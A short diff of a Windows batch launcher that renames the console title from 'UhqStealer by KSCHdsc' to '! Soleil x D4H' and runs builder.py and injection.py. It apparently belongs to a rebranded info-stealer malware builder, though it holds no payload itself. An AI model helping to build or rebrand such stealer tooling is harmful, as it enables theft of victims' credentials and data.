@@ -1,5 +1,5 @@
 @echo off
-title UhqStealer by KSCHdsc
+title ! Soleil x D4H
 python builder.py
 python injection.py
 pause
